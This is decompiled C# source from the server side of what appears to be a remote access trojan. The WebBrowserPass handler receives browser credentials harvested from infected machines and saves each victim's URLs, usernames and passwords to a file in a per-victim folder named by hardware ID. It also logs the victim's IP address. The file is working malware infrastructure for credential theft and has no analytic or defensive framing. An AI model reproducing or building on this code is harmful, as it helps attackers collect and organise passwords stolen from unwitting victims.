using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200007B RID: 123
	public class WebBrowserPass
	{
		// Token: 0x06000317 RID: 791 RVA: 0x0002263C File Offset: 0x0002083C
		public WebBrowserPass(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "WebBrowserPass");
				string asString = unpack_msgpack.ForcePathObject("Password").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllText(string.Concat(new string[]
					{
						text,
						"\\WebBrowserPass_",
						client.LV.SubItems[Program.form1.lv_user.Index].Text,
						DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss"),
						".txt"
					}), asString.Replace("\"", string.Empty).Replace("}", "").Replace("{", "============================ RXRcode     =============================").Replace(",", "").Replace("[", "").Replace("  ", "").Replace("sUrl:", "URL               :").Replace("type: ", "Web Browser       : ").Replace("sUsername: ", "User Name         : ").Replace("sPassword: ", "Password          : "));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" WebBrowserPass was saved successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ WebBrowserPass"
					}), Color.Purple);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no passwords", Color.MediumPurple);
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
